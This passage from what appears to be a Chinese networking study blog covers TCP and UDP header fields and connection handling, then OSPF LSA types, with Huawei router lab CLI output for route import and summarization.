RDP (远程桌面): 3389 每一种端口对应一种网络服务或网络应用. TCPRFC 793 TCP 是一种面向连接的传输层协议, 可提供可靠的传输服务. TCP 提供重传机制. TCP 报文头0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Source Port | Destination Port |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Sequence Number |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Acknowledgment Number |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Data | |U|A|P|R|S|F| || Offset| Reserved |R|C|S|S|Y|I| Window || | |G|K|H|T|N|N| |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Checksum | Urgent Pointer |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Options | Padding |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| data |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ TCP Header Format Note that one tick mark represents one bit position. S.port: 源端口, 16bit, 表示发送者的端口号, 发送者是普通用户时, 随机生成端口号. 提供服务端应用时, 端口号根据服务来决定. D.port: 目的端口, 16bit, 表示接收方的端口号. Sequence number: 序列号, 32bit, 用于标识 TCP 数据段的顺序. TCP 连接建立或数据传输时会将第一个 TCP 报文随机编上一个序号, 保证报文传输的有序性. 序列号随机生成但有序增长, 单位为 1 字节. ACK number: 确认序列号, 32bit, 用于 TCP 的确认机制. 用于标识接收端确认收到的数据段, 确认序列号为 成功收到的数据的序列号+1, 只在 ACK 位置位时有效. Header length: 头长度, 4bit, 用于标识 TCP 头部长度. 每个单位 4 字节. Reserved: 保留字段, 6bit, 全部为 0. URG: 紧急指针有效标识, 1bit, 此标志位可以通知此报文段中有紧急数据需要处理. ACK: 确认位, 1bit, 用于 TCP 的确认功能开启. PSH: 催促标记位, 1bit, 表示接收方应该尽快处理这个报文段, 交给应用层. RST: 重新建立标识, 1bit, 当 RST=1 时, 表示 TCP 连接出现严重错误, 必须释放连接, 然后重新建立连接. SYN: 同步序列标识, 1bit, 表示希望与对端建立连接并数据同步, 用于发起一个 TCP 连接. FIN: 结束位, 1bit, 用于 TCP 连接的关闭功能, 用于释放 TCP 连接. Window: 窗口大小, 16bit, 用于标识 TCP 单次传递数据的大小控制. 一般用于 TCP 流量控制. 窗口大小的数值代表接收端期望接收的字节数, 最大位 65535 字节. Checksum: 校验和, 16bit, 用于校验整个 TCP 报文的完整性. Urgent Pointer: 紧急指针, 16bit, 可以实现 TCP 的紧急指针功能, 只有 URG 为 1 时有效, 标识在本数据段中紧急数据的字节数. TCP 建立连接 三次握手PC Server==&gt; seq=a SYN=1 ========================&gt;&lt;== seq=b SYN=1 ACK=1 ack number=a+1 &lt;====&gt; seq=a+1 ACK=1 ack number=b+1 ==&gt; PC 主动发送 TCP 报文, 本地随机生成一个序列号 a, SYN 置位, 表示想要建立连接. Server 收到请求消息后, 本地随机生成序列号 b, 将 ACK 位置位, 确认号为对方发送请求的序列号 + 1, SYN 置位. PC 将序列号有序加 1, ACK 置位, 确认号为对方发来的序列号 + 1. TCP 传输过程 重传机制TCP 可以根据接收方的处理能力来调整自己的窗口大小, 来接收分批次的传输数据, 此时对端设备不需要每次都给与确认, 只需要确认收到报文后的最后一个序列号. 如果在传输过程中, 数据因为某些原因丢失, 那么接收方将对上一个收到的报文进行确认, 来告知对端设备, 后续报文没有收到, 此时对端设备会重传数据. 下一条序列号 = 上一条序列号 + 数据载荷长度. TCP 滑动窗口机制 流量控制当发送者根据自己的窗口大小来发送数据, 接受者会根据自己的窗口大小来接收, 窗口大小为最优的传输速率. 如果此时发送端的窗口大小大于接收端的窗口大小就会导致数据丢失. 接收端在确认时, 会将收到的最后一个数据段进行确认, 并将自己的窗口大小告诉发送端, 发送端收到此报文后会调整自己的窗口大小, 并重传. TCP 关闭连接 四次挥手PC Server==&gt; seq=a FIN=1 ACK=1 ack number=b ==&gt;&lt;== seq=b ACK=1 ack number=a+1 &lt;==&lt;== seq=b FIN=1 ACK=1 ack number=a+1 &lt;====&gt; seq=a+1 ACK=1 ack number=b+1 ==&gt; PC Server Seq = a ack number = b FIN = 1 ACK = 1==&gt; (发起关闭连接) &lt;== seq = b ack number = a+1 ACK = 1 (确认并将确认位置位, ack number 为对方的序列号 + 1) &lt;== seq = b ack number = a+1 FIN = 1 ACK = 1 (因为 TCP 双向关闭连接, 所以双向关闭) Seq = a+1 ACK ack number = b+1 (PC 序列号自加, 确认位置位, ack number 为对方的序列号 + 1) TCP 特点 1. 运行于传输层 2. 为网络提供可靠的接入 3. 是一种面向连接的协议 4. 是一种全双工的, 会建立双向通道的协议 5. 具备错误检查能力 6. 数据段序列化 7. 具备接收确认机制 8. 具备数据重传机制 UDPRFC 768 UDP: 用户数据包协议. 提供不可靠的传输服务, 具有 TCP 没有的优势. UDP 无连接, 时间上不需要建立连接所需要的时延; 空间上, TCP 需要在端系统中维护连接状态, UDP 不需要. 特点: 运行于传输层 是一种无面向连接的协议 提供有限的错误检查能力 采用尽力而为的传输方式 不具备数据重传功能 一些时延敏感的流量, 如语音视频等, 通常使用 UDP 作为传输层协议. UDP 端口号范围: 0-65535 知名端口号: 0-1023 注册端口号: 1024-49151 动态端口号: 49152-65535 基于 UDP 的应用层协议 DNS: 域名解析协议 53 DHCP: 动态主机配置协议 67 68 TFTP: 轻量级文件传输协议 69 SNMP: 简单网络管理协议 161 RIP: 路由信息协议 520 一个距离矢量路由协议 BFD: 双向转发检测 3784 UDP 报文头0 7 8 15 16 23 24 31 +--------+--------+--------+--------+ | Source | Destination | | Port | Port | +--------+--------+--------+--------+ | | | | Length | Checksum | +--------+--------+--------+--------+ | | data octets ... +---------------- ... User Datagram Header Format S.port: 源端口. D.port: 目的端口. Length: UDP 报文总长度. Checksum: 校验和, 校验 UDP 报文完整性."},{"title":"","date":"2024-02-19T02:00:00.000Z","updated":"2024-02-19T02:00:00.000Z","comments":true,"path":"notes/datacom/22.html","permalink":"https://blog.mhuig.top/notes/datacom/22","excerpt":"","text":"OSPF 路由计算 OSPF 路由计算 OSPF 路由计算每台 OSPF 设备生成自己的 LSA 信息, 通过建立邻接关系, 与直连设备交互 LSA, 最终在区域内泛洪 LSA 信息, 形成完整的 LSDB. 通过 SPF 算法计算到达每个节点的最优路径, 将最优的信息加入到路由表中. 常见的 LSA常见的 LSA 有 5 种: Router-LSA Network-LSA Network-summary-LSA ASBR-summary-LSA AS-External-LSA 区域内部计算: 1 类 2 类 区域间计算: 3 类 区域外部计算: 4 类 5 类 LSA 头部字段信息 LS Age: 表示 LSA 已经生存的时间, 单位秒, 最大老化时间 3600s, 更新时间 1800s. (有一个新的 LSA 去顶替旧的 LSA 会强制老化 3600s) Option: 可选项 LS type: 链路状态类型, 标识 LSA 的类型 LS ID: 链路状态 ID, 用于标识特定的 LSA 信息, 在不同的 LSA 中, LS ID 的意义不同 Adv Router: 标识生成该 LSA 的 OSPF 设备, 生成该 LSA 设备的 RID. Seq: 序列号, 每当产生新的 LSA 时, 序列号会增加, 通过序列号可以判断 LSA 的新旧. Checksum: 校验和, 用于校验报文的完整性, 防止被篡改 Length: LSA 的总长度. LSA 类型LSA1: Router LSA (路由器 LSA),每台 OSPF 设备都会生成, 描述了该设备在本区域所连接的网络和节点信息, 只能在本区域内传递, 不能跨区域 LSA2: Network LSA (网络 LSA),由 DR 生成, 用于描述广播型网络和 NBMA 网络. 该 LSA 包含了该网络上所连接的路由器的列表, 只在该网络所属的区域进行泛洪. LSA3: ABR 生成, 描述本区域的一段路由信息传递到其他区域泛洪, LSA3 只在生成的区域内传递, 如果需要传入下一个区域, 需要另一个 ABR 重新计算生成新的 LSA3. LSA4: ASBR 汇总 LSA, 由 ABR 生成, 描述到某一 ASBR 的路由信息. 在 ABR 所连接的区域内泛洪 (除了描述 ASBR 所在的区域). LSA5: AS 外部 LSA, 由 ABR 生成, 描述 AS 外部某一网段的路由信息, 在整个 AS 内泛洪 (不包括特殊区域),通告 LSA5 时, 不管经过哪个路由器都不会改变. LSA7: 由 ASBR 产生，用于描述到达 OSPF 域外的路由. NSSA LSA 与 AS 外部 LSA 功能类似，但是泛洪范围不同. NSSA LSA 只能在始发的 NSSA 内泛洪，并且不能直接进入 Area0. NSSA 的 ABR 会将 7 类 LSA 转换成 5 类 LSA 注入到 Area0. Router LSA一类 LSA: LS ID: 表示生成这条 LSA 设备的 RID 一份一类 LSA 中会包含多个 link, 每个 link 描述了该设备在本区域内连接的一个网络或节点 1.P2P: OSPF 在串行链路中会使用两个 link 来描述该链路信息, 其中 stubnet link 用来描述链路的网络信息, P2P 用来描述所连接的节点信息 Link type: 链路类型 P2P Link ID: 所连接节点的 RID Link Data: 表示本设备接口的 IP 地址 Metric: 度量值, 表示开销 2.stubnet 表示 OSPF 设备连接到一个末节网络, 描述网络信息 Link type: 链路类型 stubnet Link ID: 表示该设备所连接的网络号 Link Data: 表示该设备所连接的网络掩码 Metric: 表示到达此网络的开销 3.transnet: 描述了 OSPF 设备到达 DR (伪节点) 的开销情况 Link ID: DR 的接口 IP 地址 Link Data: 该设备接口 IP 地址 Metric: 表示到达 DR (伪节点) 的开销 Shell查看 LSDB 表 [R1]display ospf lsdb OSPF Process 1 with Router ID 1.1.1.1 Link State Database Area: 0.0.0.0 Type LinkState ID AdvRouter Age Len Sequence Metric Router 2.2.2.2 2.2.2.2 312 48 80000006 0 Router 1.1.1.1 1.1.1.1 311 48 80000007 0 Router 3.3.3.3 3.3.3.3 311 48 80000006 0 Network 123.1.1.1 1.1.1.1 311 36 80000003 0 查看产生的 LSA 的详细信息 [R1]display ospf lsdb router OSPF Process 1 with Router ID 1.1.1.1 Area: 0.0.0.0 Link State Database Type : Router Ls id : 4.4.4.4 Adv rtr : 4.4.4.4 Ls age : 66 Len : 60 Options : E seq# : 80000004 chksum : 0xcdab Link count: 3 * Link ID: 1.1.1.1 Data : 14.1.1.4 Link Type: P-2-P Metric : 48 * Link ID: 14.1.1.0 Data : 255.255.255.0 Link Type: StubNet Metric : 48 Priority : Low * Link ID: 4.4.4.4 Data : 255.255.255.255 Link Type: StubNet Metric : 0 Priority : Medium Type : Router Ls id : 2.2.2.2 Adv rtr : 2.2.2.2 Ls age : 292 Len : 48 Options : E seq# : 8000000f chksum : 0xc954 Link count: 2 * Link ID: 2.2.2.2 Data : 255.255.255.255 Link Type: StubNet Metric : 0 Priority : Medium * Link ID: 123.1.1.2 Data : 123.1.1.2 Link Type: TransNet Metric : 1 Type : Router Ls id : 1.1.1.1 Adv rtr : 1.1.1.1 Ls age : 66 Len : 72 Options : E seq# : 80000011 chksum : 0x4831 Link count: 4 * Link ID: 123.1.1.2 Data : 123.1.1.1 Link Type: TransNet Metric : 1 * Link ID: 1.1.1.1 Data : 255.255.255.255 Link Type: StubNet Metric : 0 Priority : Medium * Link ID: 4.4.4.4 Data : 14.1.1.1 Link Type: P-2-P Metric : 48 * Link ID: 14.1.1.0 Data : 255.255.255.0 Link Type: StubNet Metric : 48 Priority : Low Type : Router Ls id : 3.3.3.3 Adv rtr : 3.3.3.3 Ls age : 299 Len : 48 Options : E seq# : 8000000f chksum : 0xb957 Link count: 2 * Link ID: 3.3.3.3 Data : 255.255.255.255 Link Type: StubNet Metric : 0 Priority : Medium * Link ID: 123.1.1.2 Data : 123.1.1.3 Link Type: TransNet Metric : 1 Network LSA二类 LSA: LS ID: DR 的接口 IP 地址 Network mask: 网络掩码信息 ATT Router: 连接到该 MA 网络的路由器的 RID, 包括 DR 的 RID [R1]dis ospf lsdb network OSPF Process 1 with Router ID 1.1.1.1 Area: 0.0.0.0 Link State Database Type : Network Ls id : 123.1.1.2 Adv rtr : 2.2.2.2 Ls age : 1112 Len : 36 Options : E seq# : 8000000e chksum : 0xffa9 Net mask : 255.255.255.0 Priority : Low Attached Router 2.2.2.2 Attached Router 1.1.1.1 Attached Router 3.3.3.3 区域间路由计算OSPF 只能在区域内传递 LSA1,LSA2, 所以在区域间 ABR 设备会将路由表中的路由信息以 LSA3 的形式传入到其他区域, 从而让其他区域的路由器可以计算相应的路由信息. Network summary LSALSA3: 每个 3 类 LSA 实际上就是一个网络信息, ABR 将路由信息转换成 LSA3 并且描述到达网络的开销, 其他的 OSPF 设备根据 LSA3 以及自身到达 ABR 的开销值, 计算得到区域间路由, LSA3 只在生成的区域内传递, 如果需要传入下一个区域, 需要另一个 ABR 重新计算生成 LSA3. LS ID: 所描述的网络信息的网络号 Network Mask 该网络信息的掩码 Metric: 开销 区域间路由防环机制1.OSPF 要求所有的非骨干区域必须与 Area0 直接相连, 区域间路由需经由 Area0 中转。 区域间的路由传递不能发生在两个非骨干区域之间, 这使得 OSPF 的区域架构在逻辑上形成了一个类似星型的拓扑 2.ABR 不会将描述到达某个区域内网段路由的 3 类 LSA 再注入回该区域 3.ABR 从非骨干区域收到的 3 类 LSA 不能用于区域间路由的计算。 AS External LSALSA5: LS ID: 所描述外部网络的网络号 Network Mask: 网络掩码 Metric: 外部开销值, 表示 ASBR 到达外部网络的开销 E TYPE: 外部路由类型 TYPE 1: 在 OSPF 域内计算时, 会累加内部开销和外部开销 TYPE 2: 在 OSPF 域内计算时, 只显示外部路由开销, 不累加 OSPF 内部开销 (缺省类型为 TYPE 2) FA: 转发地址, 用于 OSPF 外部路由器的路径调优. TAG: 默认值 1, 给传递的路由信息打上标签, 主要用于控制外部路由的传递 ASBR Summary LSALSA4: LS ID: 所描述 ASBR 的 RID Metric: 度量值, 描述生成该 LSA 设备到达 ASBR 的开销 LSA4 中没有掩码信息 LSA4 的传递规则和 LSA3 一致, OSPF 域间防环规则同样适用于 LSA4. Shell[R5]ip route-static 7.7.7.7 32 57.1.1.7[R7]ip route-static 0.0.0.0 0 57.1.1.5&lt;R2&gt;ping 7.7.7.7 PING 7.7.7.7: 56 data bytes, press CTRL_C to break Request time out Request time out Request time out Request time out Request time out --- 7.7.7.7 ping statistics --- 5 packet(s) transmitted 0 packet(s) received 100.00% packet loss[R5-ospf-1]import-route ? bgp Border Gateway Protocol (BGP) routes direct Connected routes isis Intermediate System to Intermediate System (IS-IS) routes limit Limit the number of routes imported into OSPF ospf Open Shortest Path First (OSPF) routes rip Routing Information Protocol (RIP) routes static Static routes unr User Network Routes// 引入外部路由[R5-ospf-1]import-route static &lt;R2&gt;ping 7.7.7.7 PING 7.7.7.7: 56 data bytes, press CTRL_C to break Reply from 7.7.7.7: bytes=56 Sequence=1 ttl=254 time=110 ms Reply from 7.7.7.7: bytes=56 Sequence=2 ttl=254 time=140 ms Reply from 7.7.7.7: bytes=56 Sequence=3 ttl=254 time=120 ms Reply from 7.7.7.7: bytes=56 Sequence=4 ttl=254 time=40 ms Reply from 7.7.7.7: bytes=56 Sequence=5 ttl=254 time=30 ms --- 7.7.7.7 ping statistics --- 5 packet(s) transmitted 5 packet(s) received 0.00% packet loss round-trip min/avg/max = 30/88/140 ms[R5]display ospf lsdb ase OSPF Process 1 with Router ID 5.5.5.5 Link State Database Type : External Ls id : 7.7.7.7 Adv rtr : 5.5.5.5 Ls age : 45 Len : 36 Options : E seq# : 80000001 chksum : 0x257b Net mask : 255.255.255.255 TOS 0 Metric: 1 E type : 2 Forwarding Address : 0.0.0.0 Tag : 1 Priority : Low[R1]display ip routing-table Route Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public Destinations : 20 Routes : 20 Destination/Mask Proto Pre Cost Flags NextHop Interface 1.1.1.1/32 Direct 0 0 D 127.0.0.1 LoopBack0 2.2.2.2/32 OSPF 10 1 D 123.1.1.2 GigabitEthernet0/0/0 3.3.3.3/32 OSPF 10 1 D 123.1.1.3 GigabitEthernet0/0/0 4.4.4.4/32 OSPF 10 48 D 14.1.1.4 Serial4/0/0 5.5.5.5/32 OSPF 10 2 D 123.1.1.2 GigabitEthernet0/0/0 6.6.6.6/32 OSPF 10 49 D 14.1.1.4 Serial4/0/0 7.7.7.7/32 O_ASE 150 1 D 123.1.1.2 GigabitEthernet0/0/0 14.1.1.0/24 Direct 0 0 D 14.1.1.1 Serial4/0/0 14.1.1.1/32 Direct 0 0 D 127.0.0.1 Serial4/0/0 14.1.1.4/32 Direct 0 0 D 14.1.1.4 Serial4/0/0 14.1.1.255/32 Direct 0 0 D 127.0.0.1 Serial4/0/0 25.1.1.0/24 OSPF 10 2 D 123.1.1.2 GigabitEthernet0/0/0 46.1.1.0/24 OSPF 10 49 D 14.1.1.4 Serial4/0/0 123.1.1.0/24 Direct 0 0 D 123.1.1.1 GigabitEthernet0/0/0 123.1.1.1/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 123.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 127.0.0.0/8 Direct 0 0 D 127.0.0.1 InLoopBack0 127.0.0.1/32 Direct 0 0 D 127.0.0.1 InLoopBack0127.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0255.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0---------[R5]ospf[R5-ospf-1]dis th[V200R003C00]#ospf 1 router-id 5.5.5.5 import-route static area 0.0.0.2 network 5.5.5.5 0.0.0.0 network 25.1.1.5 0.0.0.0 #return[R5-ospf-1]undo import-route static[R5-ospf-1]import-route static ? cost Set cost route-policy Route policy tag Specify route tag type Metric type of the imported external routes &lt;cr&gt; Please press ENTER to execute command [R5-ospf-1]import-route static type 1[R5-ospf-1]dis th[V200R003C00]#ospf 1 router-id 5.5.5.5 import-route static type 1 area 0.0.0.2 network 5.5.5.5 0.0.0.0 network 25.1.1.5 0.0.0.0 #return[R1]display ip routing-table Route Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public Destinations : 20 Routes : 20 Destination/Mask Proto Pre Cost Flags NextHop Interface 1.1.1.1/32 Direct 0 0 D 127.0.0.1 LoopBack0 2.2.2.2/32 OSPF 10 1 D 123.1.1.2 GigabitEthernet0/0/0 3.3.3.3/32 OSPF 10 1 D 123.1.1.3 GigabitEthernet0/0/0 4.4.4.4/32 OSPF 10 48 D 14.1.1.4 Serial4/0/0 5.5.5.5/32 OSPF 10 2 D 123.1.1.2 GigabitEthernet0/0/0 6.6.6.6/32 OSPF 10 49 D 14.1.1.4 Serial4/0/0 7.7.7.7/32 O_ASE 150 3 D 123.1.1.2 GigabitEthernet0/0/0 14.1.1.0/24 Direct 0 0 D 14.1.1.1 Serial4/0/0 14.1.1.1/32 Direct 0 0 D 127.0.0.1 Serial4/0/0 14.1.1.4/32 Direct 0 0 D 14.1.1.4 Serial4/0/0 14.1.1.255/32 Direct 0 0 D 127.0.0.1 Serial4/0/0 25.1.1.0/24 OSPF 10 2 D 123.1.1.2 GigabitEthernet0/0/0 46.1.1.0/24 OSPF 10 49 D 14.1.1.4 Serial4/0/0 123.1.1.0/24 Direct 0 0 D 123.1.1.1 GigabitEthernet0/0/0 123.1.1.1/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 123.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 127.0.0.0/8 Direct 0 0 D 127.0.0.1 InLoopBack0 127.0.0.1/32 Direct 0 0 D 127.0.0.1 InLoopBack0127.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0255.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0-------------------------[R5]ospf 1[R5-ospf-1]dis th[V200R003C00]#ospf 1 router-id 5.5.5.5 import-route static type 1 area 0.0.0.2 network 5.5.5.5 0.0.0.0 network 25.1.1.5 0.0.0.0 #return[R5-ospf-1]undo import-route static [R5-ospf-1]import-route static tag ? INTEGER&lt;0-4294967295&gt; Tag value[R5-ospf-1]import-route static tag 10[R5-ospf-1]dis ospf lsdb ase OSPF Process 1 with Router ID 5.5.5.5 Link State Database Type : External Ls id : 7.7.7.7 Adv rtr : 5.5.5.5 Ls age : 31 Len : 36 Options : E seq# : 80000001 chksum : 0xc7cf Net mask : 255.255.255.255 TOS 0 Metric: 1 E type : 2 Forwarding Address : 0.0.0.0 Tag : 10 Priority : Low---------------[R5-ospf-1]import-route direct [R5-ospf-1]display ip routing-tableRoute Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public Destinations : 20 Routes : 20 Destination/Mask Proto Pre Cost Flags NextHop Interface 1.1.1.1/32 OSPF 10 2 D 25.1.1.2 GigabitEthernet0/0/0 2.2.2.2/32 OSPF 10 1 D 25.1.1.2 GigabitEthernet0/0/0 3.3.3.3/32 OSPF 10 2 D 25.1.1.2 GigabitEthernet0/0/0 4.4.4.4/32 OSPF 10 50 D 25.1.1.2 GigabitEthernet0/0/0 5.5.5.5/32 Direct 0 0 D 127.0.0.1 LoopBack0 6.6.6.6/32 OSPF 10 51 D 25.1.1.2 GigabitEthernet0/0/0 7.7.7.7/32 Static 60 0 RD 57.1.1.7 GigabitEthernet0/0/1 14.1.1.0/24 OSPF 10 50 D 25.1.1.2 GigabitEthernet0/0/0 25.1.1.0/24 Direct 0 0 D 25.1.1.5 GigabitEthernet0/0/0 25.1.1.5/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 25.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 46.1.1.0/24 OSPF 10 51 D 25.1.1.2 GigabitEthernet0/0/0 57.1.1.0/24 Direct 0 0 D 57.1.1.5 GigabitEthernet0/0/1 57.1.1.5/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 57.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 123.1.1.0/24 OSPF 10 2 D 25.1.1.2 GigabitEthernet0/0/0 127.0.0.0/8 Direct 0 0 D 127.0.0.1 InLoopBack0 127.0.0.1/32 Direct 0 0 D 127.0.0.1 InLoopBack0127.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0255.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0 OSPF 路由选路原则域内路由 &gt; 域间路由 &gt; 外部路由 (TYPE1 &gt; TYPE2)&gt; 开销 OSPF 路由汇总3 类路由汇总 Network-summary-LSA [R6]int lo1[R6-LoopBack1]ip add 10.1.1.1 24[R6-LoopBack1]int lo2[R6-LoopBack2]ip add 10.1.2.1 24[R6-LoopBack2]int lo3[R6-LoopBack3]ip add 10.1.3.1 24[R6-LoopBack3]q[R6]ospf 1[R6-ospf-1]a 1[R6-ospf-1-area-0.0.0.1]net [R6-ospf-1-area-0.0.0.1]network 10.1.1.1 0.0.0.0[R6-ospf-1-area-0.0.0.1]network 10.1.2.1 0.0.0.0[R6-ospf-1-area-0.0.0.1]network 10.1.3.1 0.0.0.0[R6-ospf-1-area-0.0.0.1]q[R6-ospf-1]dis th[V200R003C00]#ospf 1 router-id 6.6.6.6 area 0.0.0.1 network 6.6.6.6 0.0.0.0 network 10.1.1.1 0.0.0.0 network 10.1.2.1 0.0.0.0 network 10.1.3.1 0.0.0.0 network 46.1.1.6 0.0.0.0 #return[R6-ospf-1][R4]display ospf lsdb OSPF Process 1 with Router ID 4.4.4.4 Link State Database Area: 0.0.0.0 Type LinkState ID AdvRouter Age Len Sequence Metric Router 4.4.4.4 4.4.4.4 627 60 80000008 0 Router 2.2.2.2 2.2.2.2 594 48 8000000A 1 Router 1.1.1.1 1.1.1.1 591 72 8000000F 1 Router 3.3.3.3 3.3.3.3 591 48 8000000E 1 Network 123.1.1.3 3.3.3.3 591 36 80000007 0 Sum-Net 6.6.6.6 4.4.4.4 594 28 80000003 1 Sum-Net 5.5.5.5 2.2.2.2 598 28 80000003 1 Sum-Net 46.1.1.0 4.4.4.4 632 28 80000003 1 Sum-Net 10.1.3.1 4.4.4.4 148 28 80000001 1 Sum-Net 25.1.1.0 2.2.2.2 636 28 80000003 1 Sum-Net 10.1.2.1 4.4.4.4 153 28 80000001 1 Sum-Net 10.1.1.1 4.4.4.4 157 28 80000001 1 Sum-Asbr 5.5.5.5 2.2.2.2 741 28 80000001 1 Area: 0.0.0.1 Type LinkState ID AdvRouter Age Len Sequence Metric Router 4.4.4.4 4.4.4.4 594 36 80000006 1 Router 6.6.6.6 6.6.6.6 149 84 8000000B 1 Network 46.1.1.6 6.6.6.6 585 32 80000004 0 Sum-Net 5.5.5.5 4.4.4.4 592 28 80000003 50 Sum-Net 3.3.3.3 4.4.4.4 602 28 80000003 49 Sum-Net 14.1.1.0 4.4.4.4 632 28 80000003 48 Sum-Net 123.1.1.0 4.4.4.4 602 28 80000004 49 Sum-Net 4.4.4.4 4.4.4.4 632 28 80000003 0 Sum-Net 2.2.2.2 4.4.4.4 592 28 80000003 49 Sum-Net 25.1.1.0 4.4.4.4 592 28 80000003 50 Sum-Net 1.1.1.1 4.4.4.4 626 28 80000003 48 Sum-Asbr 5.5.5.5 4.4.4.4 739 28 80000001 50 AS External Database Type LinkState ID AdvRouter Age Len Sequence Metric External 7.7.7.7 5.5.5.5 744 36 80000001 1 External 5.5.5.5 5.5.5.5 626 36 80000001 1 External 25.1.1.0 5.5.5.5 626 36 80000001 1 External 57.1.1.0 5.5.5.5 626 36 80000001 1 [R4]ospf 1[R4-ospf-1]a 1[R4-ospf-1-area-0.0.0.1]abr-summary ? IP_ADDR&lt;X.X.X.X&gt; IP address[R4-ospf-1-area-0.0.0.1]abr-summary 10.1.0.0 ? IP_ADDR&lt;X.X.X.X&gt; IP address mask[R4-ospf-1-area-0.0.0.1]abr-summary 10.1.0.0 255.255.252.0[R4-ospf-1-area-0.0.0.1]dis th[V200R003C00]# area 0.0.0.1 abr-summary 10.1.0.0 255.255.252.0 network 46.1.1.4 0.0.0.0 #return[R4-ospf-1-area-0.0.0.1][R1]display ospf lsdb OSPF Process 1 with Router ID 1.1.1.1 Link State Database Area: 0.0.0.0 Type LinkState ID AdvRouter Age Len Sequence Metric Router 4.4.4.4 4.4.4.4 1218 60 80000008 0 Router 2.2.2.2 2.2.2.2 1183 48 8000000A 1 Router 1.1.1.1 1.1.1.1 1180 72 8000000F 1 Router 3.3.3.3 3.3.3.3 1180 48 8000000E 1 Network 123.1.1.3 3.3.3.3 1180 36 80000007 0 Sum-Net 6.6.6.6 4.4.4.4 1185 28 80000003 1 Sum-Net 5.5.5.5 2.2.2.2 1187 28 80000003 1 Sum-Net 46.1.1.0 4.4.4.4 1223 28 80000003 1 Sum-Net 25.1.1.0 2.2.2.2 1225 28 80000003 1 Sum-Net 10.1.0.0 4.4.4.4 9 28 80000001 1 Sum-Asbr 5.5.5.5 2.2.2.2 1330 28 80000001 1 AS External Database Type LinkState ID AdvRouter Age Len Sequence Metric External 7.7.7.7 5.5.5.5 1331 36 80000001 1 External 5.5.5.5 5.5.5.5 1213 36 80000001 1 External 25.1.1.0 5.5.5.5 1213 36 80000001 1 External 57.1.1.0 5.5.5.5 1213 36 80000001 1 外部路由汇总 5 类 [R5]ip route-static 20.1.1.0 24 57.1.1.7[R5]ip route-static 20.1.2.0 24 57.1.1.7[R5]ip route-static 20.1.3.0 24 57.1.1.7&lt;R2&gt;dis ip routing-table Route Flags: R - relay, D - download to fib------------------------------------------------------------------------------Routing Tables: Public Destinations : 24 Routes : 24 Destination/Mask Proto Pre Cost Flags NextHop Interface 1.1.1.1/32 OSPF 10 1 D 123.1.1.1 GigabitEthernet0/0/0 2.2.2.2/32 Direct 0 0 D 127.0.0.1 LoopBack0 3.3.3.3/32 OSPF 10 1 D 123.1.1.3 GigabitEthernet0/0/0 4.4.4.4/32 OSPF 10 49 D 123.1.1.1 GigabitEthernet0/0/0 5.5.5.5/32 OSPF 10 1 D 25.1.1.5 GigabitEthernet0/0/1 6.6.6.6/32 OSPF 10 50 D 123.1.1.1 GigabitEthernet0/0/0 7.7.7.7/32 O_ASE 150 1 D 25.1.1.5 GigabitEthernet0/0/1 10.1.0.0/22 OSPF 10 50 D 123.1.1.1 GigabitEthernet0/0/0 14.1.1.0/24 OSPF 10 49 D 123.1.1.1 GigabitEthernet0/0/0 20.1.1.0/24 O_ASE 150 1 D 25.1.1.5 GigabitEthernet0/0/1 20.1.2.0/24 O_ASE 150 1 D 25.1.1.5 GigabitEthernet0/0/1 20.1.3.0/24 O_ASE 150 1 D 25.1.1.5 GigabitEthernet0/0/1 25.1.1.0/24 Direct 0 0 D 25.1.1.2 GigabitEthernet0/0/1 25.1.1.2/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 25.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/1 46.1.1.0/24 OSPF 10 50 D 123.1.1.1 GigabitEthernet0/0/0 57.1.1.0/24 O_ASE 150 1 D 25.1.1.5 GigabitEthernet0/0/1 123.1.1.0/24 Direct 0 0 D 123.1.1.2 GigabitEthernet0/0/0 123.1.1.2/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 123.1.1.255/32 Direct 0 0 D 127.0.0.1 GigabitEthernet0/0/0 127.0.0.0/8 Direct 0 0 D 127.0.0.1 InLoopBack0 127.0.0.1/32 Direct 0 0 D 127.0.0.1 InLoopBack0127.255.255.255/32 Direct 0 0 D 127.0.0.1 InLoopBack0255.255.255.255/32 Direct 0 0 D 127.0.0.1 